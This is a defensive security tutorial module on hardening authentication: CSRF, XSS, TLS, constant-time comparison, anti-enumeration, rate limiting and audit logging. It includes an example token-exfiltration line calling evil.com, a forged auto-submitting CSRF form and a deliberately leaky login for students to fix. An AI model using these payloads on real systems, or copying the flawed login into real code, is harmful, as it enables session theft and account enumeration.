# Module 07: Securing Auth in Practice

## Why this matters

You've built every piece of an auth system: sessions, JWTs, OAuth2, API keys,
MFA, and authorization. Every one of them can be individually "correct" and the
system as a whole can still be trivially broken — because attackers don't attack
your crypto, they attack the *seams*: the cookie that wasn't quite locked down,
the login that leaks which usernames exist, the error message that tells them
they're halfway there, the comparison that takes a few microseconds longer for a
right guess, the endpoint with no rate limit that they hammer a billion times.
This module is the hardening pass — the difference between code that passes a
demo and code that survives contact with real adversaries.

None of these defenses are optional in production. CSRF, XSS, and MITM are the
attacks that steal live sessions and tokens. Information leakage through error
messages and timing turns "I have no idea if this account exists" into "give me
an afternoon and I'll enumerate your whole user base." Rate limiting and account
lockout are what stand between an attacker and unlimited password guesses. Audit
logging is how you find out you were attacked — and prove what happened
afterward. Your capstone requires most of these explicitly; this module is where
you learn to build them so they actually work.

## Concepts

### CSRF — Cross-Site Request Forgery

CSRF exploits the exact property that makes cookies convenient (module 01): the
browser sends your session cookie **automatically** on *every* request to your
origin — including requests triggered by a *different, malicious* site. The
attack:

```
1. Victim is logged into bank.com (has a valid session cookie).
2. Victim visits evil.com, which contains:
     <form action="https://bank.com/transfer" method="POST" hidden>
       <input name="to" value="attacker"><input name="amount" value="10000">
     </form>  <script>form.submit()</script>
3. The browser POSTs to bank.com and ATTACHES the victim's bank.com session
   cookie automatically. bank.com sees a valid session → executes the transfer.
```

The victim never authorized it; their browser was tricked into making an
authenticated request. Defenses (use more than one):

- **`SameSite` cookies** (module 01) — `SameSite=Lax` (or `Strict`) stops the
  cookie from being sent on cross-site subrequests like the forged POST above.
  This is the modern first line of defense and often sufficient, but don't rely
  on it alone (older browsers, and `Lax` still allows top-level GET
  navigations).
- **CSRF tokens (synchronizer token pattern)** — the server embeds an
  unpredictable per-session token in forms/pages; state-changing requests must
  echo it back (in a header or body). The attacker's site can't read the token
  (same-origin policy), so it can't forge a valid request. The standard robust
  defense for cookie-based apps.
- **Double-submit cookie** — a stateless variant: send the CSRF token both as a
  cookie and as a header; the server checks they match. Cheaper (no server
  state) but has caveats.
- CSRF primarily threatens **cookie/session** auth. Bearer-token APIs (module
  02), where the client must *explicitly* attach `Authorization: Bearer ...`
  (browsers don't do it automatically), are largely immune — which is one
  reason SPAs often use bearer tokens. But then you must guard those tokens
  against XSS instead.

```
  forged POST from evil.com ─► bank.com
     SameSite=Lax ─────► cookie NOT attached cross-site ─► no session ─► reject
     CSRF token ───────► attacker can't read same-origin token ─► header missing ─► 403
  legit POST from bank.com ─► cookie + matching X-CSRF-Token ─► accepted
```

### XSS — Cross-Site Scripting (and why it's the auth killer)

XSS is injecting attacker-controlled JavaScript into your page (via unescaped
user input). It's an auth catastrophe because script running on your origin can
do *anything the user can* — including steal credentials:

- If your session/token is in a place JavaScript can read (`localStorage`, a
  non-`HttpOnly` cookie), injected script exfiltrates it in one line:
  `fetch('https://evil.com?t=' + localStorage.token)`.
- Even with `HttpOnly` cookies (which script *can't* read), XSS can still make
  authenticated requests *as* the user from their browser — a live session
  hijack.

Defenses:

- **`HttpOnly` cookies** (module 01) so script can't read the session — this is
  why bearer-token-in-`localStorage` is riskier than an `HttpOnly` session
  cookie for browser apps.
- **Output encoding / escaping** — the root fix: never inject untrusted data
  into HTML/JS unescaped. Modern template engines auto-escape; keep it on.
- **Content-Security-Policy (CSP)** — a header restricting what scripts may run/
  load, so even an injection struggles to execute or exfiltrate.
- The interplay to internalize: `SameSite`/CSRF-tokens defend cookies against
  *CSRF*; `HttpOnly`+CSP+escaping defend against *XSS*. Bearer tokens dodge CSRF
  but are more exposed to XSS theft. There's no single storage location that's
  safe against everything — you defend in layers.

### MITM — Man-in-the-Middle, and why TLS is non-negotiable

If any auth traffic travels over plain HTTP, a network attacker (rogue Wi-Fi,
compromised router) reads it — session cookies, tokens, Basic-auth passwords
(module 00), everything. Defenses:

- **TLS everywhere (HTTPS).** Mandatory for anything touching credentials. The
  `Secure` cookie flag (module 01) ensures cookies never ride plain HTTP.
- **HSTS (`Strict-Transport-Security`)** — a header telling browsers to *only*
  ever use HTTPS for your site, defeating SSL-stripping downgrade attacks.
- For high-assurance service links, **mTLS** (module 04).

### Timing attacks and constant-time comparison

This is the subtle one, and it recurred as a warning in modules 00, 04, and 05 —
here's the full treatment. A naive string/secret comparison (`==`) returns
**early** at the first differing byte. That means comparing a correct-so-far
guess takes measurably *longer* than one that's wrong at byte 1. An attacker
measuring response times can therefore recover a secret **byte by byte**, even
though they never "see" it — each correct byte is revealed by a tiny timing
increase. This applies to comparing tokens, API keys, HMAC signatures, password
hashes, TOTP codes — any secret compared against a user-supplied value.

The fix is **constant-time comparison**: an equality check whose duration
doesn't depend on *where* the mismatch is. In Python, `secrets.compare_digest(a,
b)` (and `hmac.compare_digest`) does this — it compares all bytes regardless of
early mismatches. Never use `==` for secrets.

```python
import secrets
# WRONG — leaks the secret one byte at a time via timing:
if user_token == real_token: ...
# RIGHT — constant time, mismatch position doesn't affect duration:
if secrets.compare_digest(user_token, real_token): ...
```

### Why "wrong username" and "wrong password" must take the same time

The most important *application* of the timing lesson, and a classic exam
question. Consider a naive login:

```python
user = users.get(username)
if user is None:
    return "invalid"                 # returns FAST — no hash computed
if not pwd.verify(password, user.hash):   # hashing takes ~200ms (argon2, module 05)
    return "invalid"                 # returns SLOW — a real hash was computed
return "ok"
```

Even though both paths return the same *message* ("invalid"), they take
different *times*: a nonexistent username returns almost instantly (no hash to
compute), while an existing username with a wrong password spends ~200ms
hashing. An attacker measures the difference and **enumerates valid usernames**
— fast response = no such user, slow response = real user, wrong password. That
turns your carefully generic error message into a username oracle.

The fix (module 05's `authenticate`): **always do the same work**. When the user
doesn't exist, still run a real hash verification against a stored **dummy
hash**, so both branches take the same ~200ms:

```python
DUMMY = pwd.hash("x")
def authenticate(username, password):
    user = users.get(username)
    stored = user.hash if user else DUMMY   # always verify SOMETHING
    ok = pwd.verify(password, stored)        # same work either way
    return user if (user and ok) else None
```

Constant-time *comparison* (`compare_digest`) and constant-time *control flow*
(the dummy-hash trick) are the same principle at two levels: **an attacker must
learn nothing from how long you took.**

### Information leakage through error messages

Every distinguishable response is information you're handing the attacker.
Beyond timing, the *content* leaks too:

- "No account with that email" vs "Wrong password" tells the attacker which
  emails are registered — **enumeration**. Return **one generic message**
  ("invalid credentials") for both.
- "Your account is locked" vs "invalid credentials" reveals which accounts
  exist and are worth targeting. Be careful what lockout responses reveal.
- Password reset: "we sent you an email" should be returned **whether or not**
  the email exists, so the endpoint can't be used to enumerate accounts.
- Stack traces, debug info, framework version banners — turn them off in
  production; they hand attackers a map. **Consistent, minimal, generic
  responses across failure modes** is the rule.

### Rate limiting and account lockout

Without limits, an attacker makes unlimited guesses. Two complementary
controls:

- **Rate limiting** — cap requests per identity/IP/endpoint per time window
  (e.g. 5 login attempts per minute per IP, plus a global cap). Blunts
  brute-force and credential-stuffing. Implement with a counter in Redis
  (a sliding/fixed window) or a library; return `429 Too Many Requests` with a
  `Retry-After` header.
- **Account lockout / backoff** — after N failed logins for an *account*,
  temporarily lock it or add exponential delay. Guards a *specific* account
  against targeted guessing. But beware: naive lockout is a **denial-of-service
  vector** (an attacker locks out a victim by failing their login on purpose),
  and lockout messages can leak account existence. Mitigations: prefer
  throttling/backoff over hard locks, lock on IP+account combinations, use
  CAPTCHAs after a threshold, and don't reveal lockout state in the response.

The two work together: rate limiting protects the *endpoint* from volume;
lockout/backoff protects a *targeted account*. Both feed audit logging.

```
  per-account failure state machine (backoff, not hard lock)
   OK ──fail──► fail#1 ──fail──► fail#2 ─…─► fail#N ──► THROTTLED
    ▲            │                                        │ delay/CAPTCHA
    └── success ─┴────────────────────────────────────────┘ (reset counter)
   per-IP window (parallel): INCR rl:ip ; >limit within window → 429 Retry-After
```

### Audit logging of auth events

You must be able to answer "what happened, to whom, when, from where" after an
incident — and often for compliance. Log every security-relevant auth/authz
event: logins (success **and** failure), logouts, password changes, MFA
enrollment/challenges, token issuance/refresh/revocation, permission denials
(`403`s), lockouts, and API-key use. For each, record: timestamp, the subject
(user/client id), the event type, the source IP/user-agent, and the outcome.

Two rules that are easy to get wrong: **never log the secrets themselves** — no
passwords, no full tokens, no API keys, no TOTP codes (log a token's `jti` or a
key's prefix, not the value); and make logs **tamper-evident and retained**
(append-only, shipped off-box) so an attacker who gets in can't erase their
tracks. Audit logs are also what *feed* rate limiting and anomaly detection
("100 failed logins for one account from 50 IPs" is a credential-stuffing
signal).

## Command reference

| Pattern | Purpose | Snippet |
|---|---|---|
| `secrets.compare_digest(a, b)` | constant-time secret comparison | never `==` for secrets |
| dummy-hash verify path | constant-time login (no user enumeration) | `stored = user.hash if user else DUMMY` |
| `SameSite=Lax/Strict` cookie | CSRF defense (module 01) | `set_cookie(..., samesite="lax")` |
| CSRF synchronizer token | robust CSRF defense for cookie apps | per-session token echoed in a header |
| `HttpOnly` cookie + CSP header | XSS session-theft defense | `Content-Security-Policy: default-src 'self'` |
| `Strict-Transport-Security` | force HTTPS (anti-MITM/downgrade) | `max-age=63072000; includeSubDomains` |
| `429 Too Many Requests` + `Retry-After` | rate-limit response | `raise HTTPException(429, headers={"Retry-After":"60"})` |
| Redis `INCR key` + `EXPIRE` | fixed-window rate-limit counter | per-IP/account/window |
| structured audit log record | security event trail | `{ts, subject, event, ip, outcome}` — no secrets |

A rate-limited, constant-time, audit-logged login endpoint — the module in one
snippet:

```python
import time, secrets
from fastapi import APIRouter, Request, HTTPException
router = APIRouter()

def rate_limit(key: str, limit: int, window: int):          # Redis in prod
    n = redis.incr(f"rl:{key}")
    if n == 1: redis.expire(f"rl:{key}", window)
    if n > limit:
        raise HTTPException(429, "too many attempts", headers={"Retry-After": str(window)})

def audit(event: str, subject: str | None, request: Request, outcome: str):
    log.info("audit", extra={"event": event, "subject": subject,
             "ip": request.client.host, "ua": request.headers.get("user-agent"),
             "outcome": outcome})     # NOTE: never log password/token/code values

@router.post("/login")
def login(request: Request, username: str, password: str):
    rate_limit(f"login:{request.client.host}", limit=5, window=60)   # per-IP throttle
    user = authenticate(username, password)      # constant-time (dummy-hash path)
    if not user:
        audit("login", username, request, "failure")
        raise HTTPException(401, "invalid credentials")   # ONE generic message
    audit("login", str(user.id), request, "success")
    # ... (MFA step, then issue session/JWT) ...
    return {"ok": True}
```

## Hands-on exercises

Continue in `auth-track`.

### 1. Reproduce a CSRF attack, then block it

Serve a tiny HTML page from a *different* origin (a second server on another
port) containing an auto-submitting form POSTing to your session-authenticated
state-changing endpoint. Log into your app in the browser, then load the
attacker page and watch the request go through *with* your session cookie. Now
set `SameSite=Lax` on the session cookie and reload the attack. Expected: the
forged cross-site POST no longer carries the cookie and is rejected. Then add a
CSRF synchronizer token and confirm the attack fails even without relying on
`SameSite`.

### 2. Add a CSRF token to a form flow

Implement the synchronizer pattern: issue a per-session CSRF token, require it
(in an `X-CSRF-Token` header) on all state-changing requests, and reject
mismatches with `403`. Confirm a legitimate request (token present) works and a
forged one (token absent/wrong) fails. Expected: robust CSRF protection
independent of `SameSite`.

### 3. Prove the XSS/storage tradeoff

Store a JWT in `localStorage` and write a one-line "attacker" script in the
console: `fetch('http://localhost:9999/?t='+localStorage.getItem('token'))`.
Watch it exfiltrate the token. Now switch to an `HttpOnly` session cookie and
run `document.cookie` — the session isn't there to steal. Expected: you feel why
`HttpOnly` cookies resist XSS theft where `localStorage` tokens don't (and why
bearer-token SPAs must be extra strict about XSS).

### 4. Measure a timing attack

Write two comparison functions — one using `==`, one using
`secrets.compare_digest` — comparing a user guess against a fixed 32-char
secret. Time each over many iterations for guesses that match 0, 16, and 31
leading characters:

```python
import time, secrets
SECRET = "a"*32
def naive(g): return g == SECRET
def safe(g):  return secrets.compare_digest(g, SECRET)
for g in ["b"*32, "a"*16+"b"*16, "a"*31+"b"]:
    t=time.perf_counter(); [naive(g) for _ in range(2_000_000)]; print("naive", g[:4], time.perf_counter()-t)
    t=time.perf_counter(); [safe(g)  for _ in range(2_000_000)]; print("safe ", g[:4], time.perf_counter()-t)
```

Expected: `naive`'s time *rises* with the number of correct leading characters
(the leak); `safe`'s stays flat. This is a timing side-channel, made visible.

### 5. Make login constant-time against username enumeration

Take your login and (a) time it for a nonexistent username vs an existing
username with a wrong password — observe the difference; (b) apply the
dummy-hash `authenticate` from module 05 / Concepts and re-time. Expected: after
the fix, both take ~the same time, closing the enumeration oracle. Confirm the
*message* is also identical ("invalid credentials") for both.

### 6. Rate-limit the login endpoint

Add the `rate_limit` helper (Redis `INCR`/`EXPIRE`) capping login at 5 attempts
per minute per IP. Hammer it with 10 rapid `curl`s and confirm the 6th returns
`429` with a `Retry-After` header. Expected: brute force is throttled at the
endpoint regardless of which account is targeted.

### 7. Add account lockout — carefully

Add exponential backoff after N failed attempts *for a specific account*. Then
demonstrate the DoS risk: as an "attacker," deliberately fail a victim's login
enough to lock/slow *them* out. Then mitigate (lock on IP+account, don't reveal
lockout in the response, add a CAPTCHA-after-threshold stub). Expected: you can
articulate why naive account lockout is itself an attack vector and how to
temper it.

### 8. Audit-log auth events (without leaking secrets)

Add the `audit` helper and emit records for login success/failure, logout, MFA
challenge, token issuance/revocation, and every `403` permission denial (module
06). Then grep your logs and **confirm no password, full token, API key, or
TOTP code ever appears** — only ids, `jti`s, prefixes, IPs, and outcomes.
Expected: a complete, secret-free audit trail you could hand to an incident
responder.

### 9. Diagnose and fix: the leaky login

Audit this login for every information-leakage and hardening flaw and fix them
all.

```python
@app.post("/login")
def login(username: str, password: str):
    user = users.get(username)
    if not user:
        raise HTTPException(404, "no account with that email")   # leak 1, 2
    if user.password_hash == sha256(password):                   # leak 3, plus module-05 issues
        return {"token": make_jwt(user)}
    raise HTTPException(401, "incorrect password")               # leak 4
    # no rate limit, no audit log                                # leak 5, 6
```

<details>
<summary>Solution</summary>

Flaws: (1) **distinct error for missing user** ("no account with that email")
enables username enumeration → use one generic "invalid credentials". (2)
**`404` vs `401`** further distinguishes missing-user from wrong-password → same
status and message for both. (3) **`==` on the hash** is a non-constant-time
comparison (and `sha256` is the wrong hash, module 05) → use argon2 `pwd.verify`
(which is constant-time internally) and a dummy-hash path so a missing user
costs the same time. (4) **distinct "incorrect password"** message — same
enumeration leak → generic message. (5) **no rate limiting** → add per-IP (and
per-account) throttling returning `429`. (6) **no audit logging** → log
success/failure with subject, IP, outcome (no secrets). Corrected shape: rate
limit → constant-time `authenticate` (dummy hash) → single generic `401` on any
failure → audit both outcomes → issue token only on success.

</details>

## Independent challenge

No code given. Harden the entire `auth-track` login/session/token surface you've
built across this track into something production-grade. Requirements: a
login endpoint that is **constant-time against username enumeration** (reach
back to **module 05**'s dummy-hash technique), returns **one generic message and
status** across every failure mode, is **rate-limited per IP and per account**
with `429`/`Retry-After`, and applies **backoff-style lockout that is not itself
a DoS or enumeration vector**; session cookies with `HttpOnly`/`Secure`/
`SameSite` plus a **CSRF token** for state-changing requests (reach back to
**module 01**); **constant-time comparison** (`compare_digest`) everywhere a
secret is checked (API keys from **module 04**, tokens from **module 02**); and
a **secret-free audit log** of every auth/authz event including the `403`
permission denials from **module 06**. Then write a threat-model note mapping
each defense to the specific attack it stops (CSRF, XSS, MITM, timing/
enumeration, brute force) and identifying which attack each of your credential
types (cookie-session vs bearer-JWT) is *more* exposed to and why.

<details>
<summary>Hint</summary>

The threat-model note is the real deliverable — it forces you to see that no
single defense covers everything and that your two credential types have
*opposite* exposures: the cookie-session is auto-attached by the browser so it's
the CSRF target (defend with `SameSite`+CSRF tokens) but resists XSS theft when
`HttpOnly`; the bearer JWT must be attached explicitly so it dodges CSRF but, if
kept anywhere JavaScript can read it, is the XSS-theft target (defend with CSP+
escaping, and prefer not storing it in `localStorage`). For the constant-time
login, remember the two levels are distinct: `compare_digest` fixes *comparison*
timing, while the dummy-hash path fixes *control-flow* timing (the "did we even
compute a hash" leak) — you need both, and they defend the same principle: the
attacker must learn nothing from how long you took or which message you
returned.

</details>

## Common mistakes & troubleshooting

- **Using `==` to compare secrets.** Leaks the secret byte-by-byte via timing.
  Use `secrets.compare_digest` / `hmac.compare_digest` for tokens, keys, HMACs,
  codes.
- **Fast-failing on unknown usernames.** Returning instantly when the user
  doesn't exist (no hash computed) enumerates accounts by timing. Always verify
  against a dummy hash so both paths take equal time.
- **Distinct error messages/status per failure.** "No such user" vs "wrong
  password", `404` vs `401`, "account locked" — all leak account existence/
  state. Return one generic message and status across failure modes.
- **Relying on `SameSite` alone for CSRF.** Good first line, but add CSRF tokens
  for state-changing cookie-auth requests; don't skip defense in depth.
- **Storing tokens where XSS can read them.** `localStorage`/non-`HttpOnly`
  cookies are exfiltratable by injected script. Use `HttpOnly` cookies for
  browser sessions; if you must use bearer tokens, be ruthless about XSS (CSP,
  escaping).
- **Any auth traffic over plain HTTP.** MITM reads everything. TLS everywhere,
  `Secure` cookies, HSTS.
- **No rate limit / naive account lockout.** No limit = unlimited guessing; hard
  lockout = a DoS-on-victims and enumeration vector. Rate-limit per IP+account,
  prefer backoff, don't reveal lockout state.
- **Logging secrets, or not logging at all.** Never log passwords/tokens/keys/
  codes; do log every auth event (with ids/prefixes/`jti`s) to a tamper-evident,
  retained store — it's how you detect and investigate attacks.

## Checkpoint quiz

Write down your answer to each question before expanding it — checking without attempting first is the single easiest way to fool yourself into thinking you've learned this.

1. Explain CSRF and why it specifically threatens cookie-based auth but largely
   spares bearer-token APIs. Name two defenses.
2. Why is XSS an "auth killer" even when your session cookie is `HttpOnly`?
3. What is a timing attack on a secret comparison, and what's the fix?
4. Why must a login take the same time whether the username exists or not, and
   how do you achieve that when a real password verify is slow?
5. Give three distinct ways a login endpoint can leak which accounts exist, and
   the fix for each.
6. How do rate limiting and account lockout differ in what they protect, and
   why is naive account lockout itself dangerous?
7. What should and should not appear in an auth audit log, and name two reasons
   you keep one.

<details>
<summary>Answers</summary>

1. CSRF tricks a victim's browser into making a state-changing request to a site
   where they're logged in; it works because browsers auto-attach cookies to any
   request to that origin. Bearer-token APIs require the client to *explicitly*
   set `Authorization`, which a cross-site attacker can't do, so they're largely
   immune. Defenses: `SameSite=Lax/Strict` cookies and CSRF synchronizer tokens.
2. Because injected script runs on your origin *as the user* — even if it can't
   read an `HttpOnly` cookie, it can make authenticated requests from the
   victim's browser (session hijack), and if the token lives anywhere JS can
   read (`localStorage`, non-`HttpOnly` cookie) it exfiltrates it outright.
3. A naive comparison (`==`) returns at the first differing byte, so a
   more-correct guess takes measurably longer, letting an attacker recover a
   secret byte by byte from response times. Fix: constant-time comparison
   (`secrets.compare_digest`) whose duration doesn't depend on mismatch
   position.
4. Otherwise a nonexistent username (no hash computed → fast) is distinguishable
   from a real one (hash computed → slow), enumerating accounts. Achieve equal
   time by always running a real hash verify — against a stored dummy hash when
   the user doesn't exist — so both paths do the same work.
5. (a) Distinct messages ("no such user" vs "wrong password") → one generic
   message. (b) Distinct status (`404` vs `401`) → same status for both. (c)
   Timing differences (fast fail on unknown user) → constant-time dummy-hash
   verify. (Also: a reset endpoint saying "no such email" → always say "sent".)
6. Rate limiting caps request *volume* per IP/account/window, protecting the
   endpoint from brute force/stuffing; account lockout protects a *specific*
   targeted account after N failures. Naive lockout is dangerous because an
   attacker can lock a victim out on purpose (DoS) and lockout messages can leak
   which accounts exist — so prefer backoff, lock on IP+account, and hide
   lockout state.
7. Log every security event (login success/failure, logout, MFA, token issue/
   refresh/revoke, permission denials, lockouts) with timestamp, subject, IP/
   user-agent, and outcome; never log the secrets themselves (passwords, full
   tokens, keys, TOTP codes — use `jti`/prefixes). Keep one for incident
   investigation/forensics and for compliance/anomaly detection.

</details>

## Further reading & sources

- [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) - SameSite, synchronizer tokens, and double-submit patterns.
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) - output encoding and CSP, the root XSS fixes.
- [OWASP Authentication Cheat Sheet: enumeration & generic errors](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages) - why failure responses and timing must be uniform.
- [MDN: Strict-Transport-Security (HSTS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) - forcing HTTPS to defeat SSL-stripping MITM.
- [Python secrets.compare_digest](https://docs.python.org/3/library/secrets.html#secrets.compare_digest) - the constant-time comparison this module insists on for secrets.
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) - what to record in an audit trail and what must never be logged.

## Next

[08-capstone-project](../08-capstone-project/README.md) — every concept in this
track now comes together. You'll build a single FastAPI service with session
auth for a browser and JWT auth for an API, RBAC across three tiers, TOTP MFA on
login, hardened cookies, a rate-limited and lockout-protected login, and audit
logging — the whole track, integrated and defensible.
